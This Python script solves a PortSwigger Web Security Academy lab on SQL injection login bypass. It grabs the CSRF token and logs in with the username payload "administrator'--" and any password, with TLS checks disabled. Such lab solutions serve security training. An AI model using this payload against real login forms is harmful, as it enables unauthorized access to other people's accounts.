# Lab name: Lab: SQL injection vulnerability allowing login bypass
# Lab link: https://portswigger.net/web-security/sql-injection/lab-login-bypass

import requests
from bs4 import BeautifulSoup
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {
    'http':'http://127.0.0.1:8080',
    'https':'http://127.0.0.1:8080'
}

req = requests.Session()

payload = "administrator'--"


def filter_url():
    global url
    url = (url.split('.net', 1)[0]) + f'.net/login'


def get_csrf_token_from_response(url):
    response = req.get(url, verify=False, proxies=proxies)
    soup = BeautifulSoup(response.text, 'html.parser')
    csrf_token = soup.find('input')['value']
    return csrf_token


url = input('Enter lab url: ')

filter_url()

csrf = get_csrf_token_from_response(url)

data = {
    'csrf':csrf,
    'username': payload,
    'password':'123' # password may contain any value
}

response = req.post(url, data=data, verify=False, proxies=proxies)

if '/my-account?id=administrator' in response.text:
    print('Lab solved successfully')
elif response.status_code == 504:
    print('Lab is not available, please refresh the url')
else:
    print('failed to solve lab, please check you enter valid url')



